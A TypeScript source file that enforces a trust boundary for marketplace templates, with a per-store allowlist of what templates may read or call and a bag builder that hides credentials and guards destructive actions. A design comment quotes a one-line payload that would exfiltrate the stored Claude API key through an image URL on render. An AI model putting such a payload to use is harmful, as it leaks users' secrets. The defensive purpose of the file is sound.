/**
 * What a template is allowed to say — the trust boundary, as data.
 *
 * ## The problem this exists for
 *
 * Templates and themes arrive from a marketplace or sync in from peers, and are then rendered with
 * whatever the host put in the store bag. Every member of every store was in that bag: 388 of them,
 * including `runtimeStore.trustAgent`, `runtimeStore.importDatabase`, `accountStore.removeAccount`,
 * `sessionStore.token` and `datasetStore.agentSettings` (which carries the Claude API key). A
 * template that renders normally could log you out, wipe a space, trust an attacker's DID, or put
 * your API key in a URL — as a side effect of painting, with no click and no user intent.
 *
 * VISION's claim is that a template is *safe to install from a stranger*. Nothing enforced that.
 * This file is the enforcement, and it is deliberately one file: an allowlist scattered across
 * thirteen stores is not reviewable, and the whole point is that a person can read it.
 *
 * ## How it holds together
 *
 * - **Absent, not blocked.** A member the tier does not grant is simply not in the bag. That
 *   matches the renderer's existing semantics — an unresolvable path is `undefined`, a reference to
 *   an uninstalled module resolves to nothing — and leaves a hostile template no error channel to
 *   probe.
 * - **State is tagged, actions are not.** Only members declared `state` are marked with
 *   `markReactive`, and `walkPath` now calls only tagged accessors. That closes the other half of
 *   the hole: `$store` used to *invoke* any function it walked past, so naming a zero-argument
 *   method in a `$store` path called it during paint.
 * - **Groups are the grant unit, per-member declarations are the mechanism.** Nobody can review a
 *   list of 388 method names; "this template can manage your library and your account" is
 *   reviewable. Groups are what a marketplace listing will show a human when chrome templates
 *   become installable.
 * - **`destructive` cuts across groups**, so a host can demand its own confirmation for those
 *   regardless of tier — in host chrome, where a theme's CSS cannot restyle it.
 *
 * ## Keeping it honest
 *
 * `templateSurface.test.ts` asserts that every member of every store interface appears here. A new
 * store member fails that test until it is classified, so this cannot quietly fall behind the code
 * it describes — the failure mode an allowlist beside the thing it allows usually has.
 */
import { markReactive } from '@we/schema-shared';

/**
 * What a group of capabilities lets a template do, in the words a person would use.
 *
 * Additive by contract: adding a member to a group is a minor change, moving or removing one is
 * breaking, the same discipline the schema operators follow. These names will end up in front of
 * users at install time, so they are written for that rather than for the code they gate.
 */
export const CAPABILITY_GROUPS = {
  content: 'Read and write the content of this space',
  navigation: 'Move around the app and between spaces',
  'view-state': 'Remember what you are looking at',
  signals: 'React to things, and define what a reaction means here',
  presence: 'See who else is here and say what you are doing',
  identity: 'Read profiles of people in this space',
  'space-admin': 'Change settings every member of a space sees',
  library: 'Install, publish and remove templates and themes',
  agent: 'Change your own profile, settings and preferences',
  session: 'Sign in and out, and manage local accounts',
  'runtime-admin': 'Administer the backend — trust, network, AI models, the database',
  editor: 'Drive the template and theme editing surface',
} as const;

export type CapabilityGroup = keyof typeof CAPABILITY_GROUPS;

/**
 * What an ordinary space template gets: everything needed to render a community and take part in
 * it, and nothing that changes the app, the account or the machine.
 */
export const SPACE_TIER: readonly CapabilityGroup[] = [
  'content',
  'navigation',
  'view-state',
  'signals',
  'presence',
  'identity',
];

/**
 * What host-authored chrome gets — the sidebar, settings, the marketplace, the boot screen.
 *
 * Everything, today, because all chrome is bundled with the app. When chrome becomes a marketplace
 * category the grant becomes per-template: `meta.requires` names groups, the install screen shows
 * them, and the bag is built from what was granted. Nothing here needs to change for that — which
 * is the reason for expressing the tiers as group lists rather than as two hand-written bags.
 */
export const CHROME_TIER: readonly CapabilityGroup[] = [
  ...SPACE_TIER,
  'space-admin',
  'library',
  'agent',
  'session',
  'runtime-admin',
  'editor',
];

/** Host wiring: never in any template bag, at any tier. */
const WIRING = 'wiring' as const;

interface MemberSpec {
  group: CapabilityGroup;
  /** `state` is read through `$store` and tagged reactive; `action` is called through `$action`. */
  kind: 'state' | 'action';
  /**
   * Irreversible, or expensive to reverse. Not a grant of its own — a flag the host reads to decide
   * whether to demand confirmation it owns.
   */
  destructive?: true;
}

type Classification = MemberSpec | typeof WIRING;

const state = (group: CapabilityGroup): MemberSpec => ({ group, kind: 'state' });
const action = (group: CapabilityGroup): MemberSpec => ({ group, kind: 'action' });
const destructive = (group: CapabilityGroup): MemberSpec => ({ group, kind: 'action', destructive: true });

/**
 * Every member of every store, classified.
 *
 * Ordered as the store declares them so the two read side by side. `wiring` is the common answer
 * and deliberately so: a store's public interface is how the *host* drives it, and only a fraction
 * of that is vocabulary a template should have.
 */
export const TEMPLATE_SURFACE: Record<string, Record<string, Classification>> = {
  sessionStore: {
    bootState: state('session'),
    bootError: state('session'),
    passwordError: state('session'),
    loginLoading: state('session'),
    createAgentError: state('session'),
    createAgentLoading: state('session'),
    me: state('identity'),
    host: state('session'),
    hostAccount: state('session'),
    isDevelopment: state('session'),
    login: action('session'),
    createAgent: action('session'),
    clearPasswordError: action('session'),
    finishSetup: action('session'),
    logout: action('session'),
    retryBoot: action('session'),

    // Credentials and backend handles. `token` is an executor grant for `domain: '*', can: ['*']`,
    // and `port`/`serverUrl` are how to reach it — a template that could read them could hand a
    // peer full control of the node. There is no tier where this is template vocabulary.
    token: WIRING,
    port: WIRING,
    serverUrl: WIRING,
    client: WIRING,
    agentSession: WIRING,
    lifecycle: WIRING,
    backendPorts: WIRING,
    ephemeralPort: WIRING,
    refreshMe: WIRING,
    markReady: WIRING,
    onSessionUnlocked: WIRING,
  },

  accountStore: {
    canManageAccounts: state('session'),
    accounts: state('session'),
    activeAccount: state('session'),
    hasOtherAccounts: state('session'),
    accountsLoaded: state('session'),
    isFirstRun: state('session'),
    busy: state('session'),
    switchingTo: state('session'),
    creating: state('session'),
    error: state('session'),
    pendingRemoval: state('session'),
    refresh: action('session'),
    createAccount: action('session'),
    switchAccount: action('session'),
    removeAccount: destructive('session'),
    requestRemoval: action('session'),
    cancelRemoval: action('session'),
    confirmRemoval: destructive('session'),
    clearError: action('session'),

    // Called by ProfileStore to mirror the profile onto the locked sign-in screen.
    syncDisplay: WIRING,
  },

  runtimeStore: {
    canAdminister: state('runtime-admin'),
    canManageTrust: state('runtime-admin'),
    canManageNetwork: state('runtime-admin'),
    canManageApps: state('runtime-admin'),
    canManageLanguages: state('runtime-admin'),
    canManageAi: state('runtime-admin'),
    canConfigureAi: state('runtime-admin'),
    canConfigureExecutor: state('runtime-admin'),
    aiModels: state('runtime-admin'),
    aiTasks: state('runtime-admin'),
    aiForm: state('runtime-admin'),
    aiPresetOptions: state('runtime-admin'),
    aiFormComplete: state('runtime-admin'),
    languages: state('runtime-admin'),
    trustedAgents: state('runtime-admin'),
    authorizedApps: state('runtime-admin'),
    networkMetrics: state('runtime-admin'),
    peerInfos: state('runtime-admin'),
    loading: state('runtime-admin'),
    error: state('runtime-admin'),
    canBackUp: state('runtime-admin'),
    logLevels: state('runtime-admin'),
    backupStatus: state('runtime-admin'),
    mcpEnabled: state('runtime-admin'),
    mcpPort: state('runtime-admin'),
    executorRestartPending: state('runtime-admin'),
    pendingConsent: state('runtime-admin'),
    consentSecret: state('runtime-admin'),
    loadAiModels: action('runtime-admin'),
    loadAiTasks: action('runtime-admin'),
    newAiModel: action('runtime-admin'),
    editAiModel: action('runtime-admin'),
    setAiFormField: action('runtime-admin'),
    closeAiForm: action('runtime-admin'),
    saveAiModel: action('runtime-admin'),
    removeAiModel: destructive('runtime-admin'),
    setDefaultAiModel: action('runtime-admin'),
    removeAiTask: destructive('runtime-admin'),
    loadLanguages: action('runtime-admin'),
    installLanguage: action('runtime-admin'),
    removeLanguage: destructive('runtime-admin'),
    loadTrustedAgents: action('runtime-admin'),
    trustAgent: destructive('runtime-admin'),
    untrustAgent: destructive('runtime-admin'),
    loadAuthorizedApps: action('runtime-admin'),
    revokeApp: destructive('runtime-admin'),
    removeApp: destructive('runtime-admin'),
    loadNetworkMetrics: action('runtime-admin'),
    restartNetwork: destructive('runtime-admin'),
    loadPeerInfos: action('runtime-admin'),
    addPeerInfos: action('runtime-admin'),
    setMcpEnabled: action('runtime-admin'),
    setLogLevel: action('runtime-admin'),
    removeLogLevel: action('runtime-admin'),
    exportDatabase: action('runtime-admin'),
    importDatabase: destructive('runtime-admin'),
    setMcpPort: action('runtime-admin'),
    restartExecutor: destructive('runtime-admin'),
    approveConsent: destructive('runtime-admin'),
    denyConsent: action('runtime-admin'),
    dismissConsentSecret: action('runtime-admin'),
  },

  datasetStore: {
    datasets: state('navigation'),
    orderedDatasets: state('navigation'),
    currentDataset: state('content'),
    currentDatasetUri: state('content'),
    currentDatasetCid: state('content'),
    currentDatasetModels: state('content'),
    isWeSpace: state('navigation'),
    joinedSpaceCids: state('navigation'),
    datasetsLoaded: state('navigation'),
    systemDatasetUuids: state('navigation'),
    globalSpaceConfigured: state('navigation'),
    globalSpaceId: state('navigation'),
    marketplaceConfigured: state('navigation'),
    marketplaceId: state('navigation'),
    marketplaceJoined: state('navigation'),
    switchDataset: action('navigation'),
    reorderDatasets: action('agent'),
    removeDataset: destructive('space-admin'),
    cleanupSpaceSdna: action('space-admin'),

    /*
      Agent settings and the datasets that hold them.

      `agentSettings` carries `claudeApiKey`. Exposed, a template needed one styled element —
      `bgImage: { $concat: ['https://…?k=', { $store: 'datasetStore.agentSettings.claudeApiKey' }] }`
      — to exfiltrate it on paint. Any URL-valued prop is a network channel, so this is not fixable
      by watching for suspicious actions.

      The root/global/marketplace handles go with it, and not only for tidiness: they are what a
      `$query`'s `dataset` option resolves against, so leaving them reachable would let a template
      read the same settings the long way round. `agent`-tier surfaces that genuinely need a
      setting expose it as a named accessor rather than the whole record.
    */
    agentSettings: WIRING,
    rootDataset: WIRING,
    testDataset: WIRING,
    globalDataset: WIRING,
    marketplaceDataset: WIRING,
    updateAgentSettings: WIRING,
    clearCurrentDataset: WIRING,
    trackDataset: WIRING,
    onDatasetRemoved: WIRING,
    initSystemDatasets: WIRING,
    loadDatasets: WIRING,
    subscribeToChanges: WIRING,
    getDatasetOrder: WIRING,
  },

  profileStore: {
    profiles: state('identity'),
    ownProfile: state('identity'),
    fetchProfile: action('identity'),
    pendingAvatar: state('agent'),
    setPendingAvatar: action('agent'),
    updateOwnProfile: action('agent'),
    updateProfileImage: action('agent'),
    clearProfileImage: action('agent'),
    updateOwnLocation: action('agent'),
    completeAccountSetup: action('session'),
  },

  spaceStore: {
    // ── content ──
    currentSpace: state('content'),
    memberDids: state('identity'),
    members: state('identity'),
    createPost: action('content'),
    updatePost: action('content'),
    moveChild: action('content'),
    deleteCollection: destructive('content'),
    setAttending: action('content'),
    readMarkers: state('content'),
    markRead: action('content'),
    mutedDids: state('content'),
    mutedAgents: state('content'),
    setAgentMuted: action('content'),
    getSubgroupMessages: action('content'),

    // ── signals ──
    createSignalType: action('signals'),
    upsertSignal: action('signals'),

    // ── navigation ──
    spaceList: state('navigation'),
    mySpaces: state('navigation'),
    personalSpaces: state('navigation'),
    sharedSpaces: state('navigation'),
    orderedSidebarItems: state('navigation'),
    routeSpaceUnjoined: state('navigation'),
    joiningSpace: state('navigation'),
    joinSlow: state('navigation'),
    joinError: state('navigation'),
    joinSpace: action('navigation'),
    navigateToSpace: action('navigation'),
    canAdministerSpace: action('navigation'),
    copyShareLink: action('navigation'),
    activeModules: state('navigation'),
    moduleLaunchers: state('navigation'),
    launchModule: action('navigation'),
    requiredModules: state('navigation'),
    missingModules: state('navigation'),

    // ── space-admin ──
    spaceDefaultTemplateId: state('space-admin'),
    spaceDefaultThemeId: state('space-admin'),
    creatingSpace: state('space-admin'),
    foreignSpacePrefill: state('space-admin'),
    enabledModules: state('space-admin'),
    templateOverrideOptions: state('space-admin'),
    themeOverrideOptions: state('space-admin'),
    moduleInstallSettings: state('space-admin'),
    createSpace: action('space-admin'),
    initializeAsWeSpace: action('space-admin'),
    removeSpace: destructive('space-admin'),
    updateSpaceImage: action('space-admin'),
    updateSpaceMeta: action('space-admin'),
    setSpaceDefaultTemplate: action('space-admin'),
    setSpaceDefaultTheme: action('space-admin'),
    setModuleEnabled: action('space-admin'),
    removeSpaceFromGlobal: destructive('space-admin'),

    // ── agent: this agent's own preferences, private to them ──
    installedModules: state('agent'),
    setModuleInstalled: action('agent'),
    setModuleVisible: action('agent'),
    setSpaceTemplateOverride: action('agent'),
    setSpaceThemeOverride: action('agent'),

    updateSpaceInCache: WIRING,
    loadSpaces: WIRING,
  },

  themeStore: {
    builtInThemes: state('library'),
    installedThemes: state('library'),
    spaceThemes: state('library'),
    allThemes: state('library'),
    currentThemeId: state('view-state'),
    currentTheme: state('view-state'),
    defaultThemeId: state('library'),
    themeManagementList: state('library'),
    editingTheme: state('editor'),
    operationLoading: state('library'),
    themeScope: state('view-state'),
    themeScopePreference: state('view-state'),
    themeScopeGlobal: state('view-state'),
    themeScopePreviewing: state('editor'),
    useTemplateTheme: state('view-state'),
    activeTemplateTheme: state('view-state'),
    setCurrentTheme: action('library'),
    setDefaultTheme: action('library'),
    toggleThemeInstalled: action('library'),
    previewThemeScope: action('editor'),
    setThemeScopeGlobal: action('agent'),
    setUseTemplateTheme: action('agent'),
    restorePersonalTheme: action('library'),
    clearSpaceTheme: action('space-admin'),
    startEditing: action('editor'),
    changeBasePreset: action('editor'),
    updateEditingOverrides: action('editor'),
    updateEditingCss: action('editor'),
    updateEditingMeta: action('editor'),
    cancelEditing: action('editor'),
    createAndStartEditing: action('editor'),
    saveEditingTheme: action('editor'),
    saveEditingThemeAs: action('editor'),
    deleteTheme: destructive('library'),
    installFromMarketplace: action('library'),
    uninstallTheme: destructive('library'),
    deleteMarketplaceTheme: destructive('library'),
    publishToMarketplace: action('library'),
    publishToSpace: action('library'),

    replaceTheme: WIRING,
    registerHistoryCallbacks: WIRING,
    applySnapshot: WIRING,
    loadInstalledThemes: WIRING,
    refreshSpaceThemes: WIRING,
  },

  templateStore: {
    personalTemplates: state('library'),
    spaceTemplates: state('library'),
    builtInTemplates: state('library'),
    myTemplates: state('library'),
    allTemplates: state('library'),
    templateManagementList: state('library'),
    switcherGroups: state('library'),
    currentTemplate: state('view-state'),
    loading: state('library'),
    defaultTemplateId: state('library'),
    operationLoading: state('library'),
    switchTemplate: action('library'),
    removeTemplate: destructive('library'),
    deleteTemplate: destructive('library'),
    installTemplate: action('library'),
    uninstallTemplate: action('library'),
    installFromMarketplace: action('library'),
    installToSpace: action('space-admin'),
    setDefaultTemplate: action('library'),
    saveTemplate: action('editor'),
    saveTemplateAs: action('editor'),
    publishToSpace: action('library'),
    deleteMarketplaceTemplate: destructive('library'),
    publishToMarketplace: action('library'),
    isBuiltInTemplate: action('library'),
    isInstalled: action('library'),

    /*
      Wiring, and `updateTemplate`/`replaceTemplate` especially.

      They replace the *running* schema. Reachable from a template, that is a template rewriting
      itself or another one mid-render — which is both a trust hole and the kind of thing that makes
      a render loop impossible to reason about. Editing a template is the editor's business, and the
      editor is chrome.
    */
    updateTemplate: WIRING,
    replaceTemplate: WIRING,
    persistCurrentTemplate: WIRING,
    toggleInstalled: WIRING,
    provideSpaceLookup: WIRING,
    preloadSpaceTemplates: WIRING,
    loadSpaceTemplates: WIRING,
    refreshSpaceTemplates: WIRING,
    clearSpaceTemplates: WIRING,
    getTemplateModel: WIRING,
  },

  routeStore: {
    currentPath: state('view-state'),
    segments: state('view-state'),
    params: state('view-state'),
    navigate: action('navigation'),
    setParam: action('view-state'),

    setNavigateFunction: WIRING,
    setCurrentPath: WIRING,
  },

  shellStore: {
    activeShellView: state('navigation'),
    openShellView: action('navigation'),
    closeShellView: action('navigation'),
    createSpaceOpen: state('space-admin'),
    setCreateSpaceOpen: action('space-admin'),
    scrollToId: action('view-state'),

    // Dock geometry is the host's layout arithmetic, driven by a resize handle it owns.
    takePendingPath: WIRING,
    dockGeometry: WIRING,
    contentInset: WIRING,
    dockResizing: WIRING,
    beginDockResize: WIRING,
    resizeDock: WIRING,
    endDockResize: WIRING,
  },

  presenceStore: {
    peers: state('presence'),
    online: state('presence'),
    onlineHere: state('presence'),
    calls: state('presence'),
    available: state('presence'),
    focusDepth: state('presence'),
    setFocusDepth: action('agent'),
    setAvailability: action('presence'),
    setActivity: action('presence'),
    clearActivity: action('presence'),
  },

  appStore: {
    apps: state('navigation'),
    appsWithWe: state('navigation'),
    activeAppId: state('navigation'),
    activateApp: action('navigation'),
    deactivateApp: action('navigation'),

    provideInstalledModules: WIRING,
  },

  editorStore: {
    messages: state('editor'),
    isOpen: state('editor'),
    isStreaming: state('editor'),
    streamingContent: state('editor'),
    apiKeyConfigured: state('editor'),
    templateName: state('editor'),
    templateIcon: state('editor'),
    isReadOnly: state('editor'),
    hasPendingChanges: state('editor'),
    pickerOpen: state('editor'),
    pickerAction: state('editor'),
    pickerDefaultName: state('editor'),
    pickerDefaultIcon: state('editor'),
    pickerShowDestination: state('editor'),
    sessions: state('editor'),
    activeSessionId: state('editor'),
    contentMode: state('editor'),
    schemaJson: state('editor'),
    canUndo: state('editor'),
    canRedo: state('editor'),
    isEditingTemplate: state('editor'),
    editAction: state('editor'),
    isEditingTheme: state('editor'),
    codePanelOpen: state('editor'),
    themePanelOpen: state('editor'),
    visualPanelOpen: state('editor'),
    aiPanelWidth: state('editor'),
    codePanelWidth: state('editor'),
    themePanelWidth: state('editor'),
    visualPanelWidth: state('editor'),
    newChat: action('editor'),
    switchSession: action('editor'),
    deleteSession: destructive('editor'),
    setContentMode: action('editor'),
    undo: action('editor'),
    redo: action('editor'),
    startFork: action('editor'),
    startFresh: action('editor'),
    confirmPicker: action('editor'),
    cancelPicker: action('editor'),
    enterTemplateEditing: action('editor'),
    exitTemplateEditing: action('editor'),
    toggle: action('editor'),
    open: action('editor'),
    close: action('editor'),
    toggleCodePanel: action('editor'),
    openCodePanel: action('editor'),
    closeCodePanel: action('editor'),
    toggleThemePanel: action('editor'),
    openThemePanel: action('editor'),
    closeThemePanel: action('editor'),
    toggleVisualPanel: action('editor'),
    enterThemeEditing: action('editor'),
    exitThemeEditing: action('editor'),
    toggleThemeEditing: action('editor'),
    setAiPanelWidth: action('editor'),
    setCodePanelWidth: action('editor'),
    setThemePanelWidth: action('editor'),
    setVisualPanelWidth: action('editor'),
    sendMessage: action('editor'),
    clearHistory: destructive('editor'),

    // The Claude API key. Written through a settings form in chrome, read by this store to make a
    // request — never a value any template needs to see.
    setApiKey: WIRING,
    onSchemaEdit: WIRING,
    pushSnapshot: WIRING,
  },

  /**
   * Model mutations. Reads need no entry — `$query` goes through the renderer's own bindings, and a
   * template that can render a space's data is the entire point.
   */
  model: {
    create: action('content'),
    update: action('content'),
    delete: destructive('content'),
  },
};

/** Members present in every bag: renderer bindings and template-facing vocabulary, not store state. */
const ALWAYS_PRESENT = new Set([
  'modules',
  'consoleStore',
  '$onError',
  '$routeParams',
  '$useQueryIR',
  '$me',
  '$currentDataset',
  '$getModel',
  '$getModelForPerspective',
  '$queryAdapter',
  '$identities',
  '$ephemeral',
]);

/**
 * Module stores, with every function tagged so `$store` can still read module state.
 *
 * **This is deliberately permissive, and the one place the boundary is not yet drawn.** A module's
 * store is a flat record whose members are a mix of raw signals, derived closures and actions, and
 * nothing distinguishes them — so tagging selectively is not possible without the module saying
 * which is which. Tagging all of them keeps `{ $store: 'modules.transcribe.level' }` working and
 * leaves `{ $store: 'modules.call.leave' }` callable during paint, exactly as before.
 *
 * The reason that is acceptable *today* is that modules are bundled: they are chosen by the
 * deployment's seed and ship with the app, at the same trust level as the app itself. It stops being
 * acceptable the moment modules are installable, which the module docs already anticipate — and the
 * fix has a clear shape: `ModuleStoreDeps` grows a `state()` marker, modules wrap their accessors in
 * it, and this function tags only what was marked. Left as a follow-up rather than done here because
 * it is a contract change across five modules, and doing it badly would be worse than doing it late.
 */
function taggedModuleStores(modules: Record<string, Record<string, unknown>>): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  for (const [id, store] of Object.entries(modules ?? {})) {
    if (!store || typeof store !== 'object') continue;
    out[id] = Object.fromEntries(
      Object.entries(store).map(([name, member]) => [
        name,
        typeof member === 'function' ? markReactive(member) : member,
      ]),
    );
  }
  return out;
}

export interface BuildBagOptions {
  /** Which capability groups this template was granted. */
  grants: readonly CapabilityGroup[];
  /** Called before a `destructive` action runs. Returning false refuses it. */
  onDestructive?: (path: string) => boolean;
}

/**
 * Build the bag a template renders against.
 *
 * Copies rather than proxies, so what a template can reach is decided once at construction and is
 * not a function of how it asks. A proxy would have to answer `has`/`get` for arbitrary keys, and
 * every such answer is an oracle.
 */
export function buildTemplateBag<T extends Record<string, unknown>>(stores: T, options: BuildBagOptions): T {
  const granted = new Set(options.grants);
  const bag: Record<string, unknown> = {};

  for (const key of Object.keys(stores)) {
    /*
      Modules, re-read on every access.

      `moduleStores` is one object the registry mutates in place as modules register and unregister,
      so copying its contents once would freeze the module set at whatever had loaded when this bag
      was built — and `{ $store: 'modules.notes.open' }` is documented as the way a template depends
      on an optional module.
    */
    if (key === 'modules') {
      Object.defineProperty(bag, key, {
        enumerable: true,
        get: () => taggedModuleStores(stores[key] as Record<string, Record<string, unknown>>),
      });
      continue;
    }

    /*
      Renderer bindings, by descriptor rather than by value.

      `$getModel`, `$currentDataset`, `$queryAdapter` and the rest are defined on the host's bag as
      *getters* that delegate to a memo, because the connector's ports do not exist until after
      connect. Reading them here would have captured their pre-connect value — `undefined` — and
      pinned it, which is not a subtle failure: every `$query` in every template resolves to nothing
      and the app renders empty chrome around blank content.
    */
    if (ALWAYS_PRESENT.has(key)) {
      const descriptor = Object.getOwnPropertyDescriptor(stores, key);
      if (descriptor) Object.defineProperty(bag, key, descriptor);
      continue;
    }

    const value = stores[key];

    const members = TEMPLATE_SURFACE[key];
    // A store with no classification at all is absent rather than open: an unclassified store is a
    // store nobody has decided about, and the safe reading of an undecided question is "no".
    if (!members || value == null || typeof value !== 'object') continue;

    const filtered: Record<string, unknown> = {};
    for (const [name, member] of Object.entries(value as Record<string, unknown>)) {
      const spec = members[name];
      if (spec === undefined || spec === WIRING) continue;
      if (!granted.has(spec.group)) continue;

      if (spec.kind === 'state') {
        // Tagged so `walkPath` will call it. Anything untagged is data to the resolver, never
        // something to invoke — which is what stops a `$store` path from running an action.
        filtered[name] = typeof member === 'function' ? markReactive(member) : member;
        continue;
      }

      if (spec.destructive && options.onDestructive) {
        const path = `${key}.${name}`;
        const guard = options.onDestructive;
        const method = member as (...args: unknown[]) => unknown;
        filtered[name] = (...args: unknown[]) => (guard(path) ? method(...args) : undefined);
        continue;
      }

      filtered[name] = member;
    }
    bag[key] = filtered;
  }

  return bag as T;
}
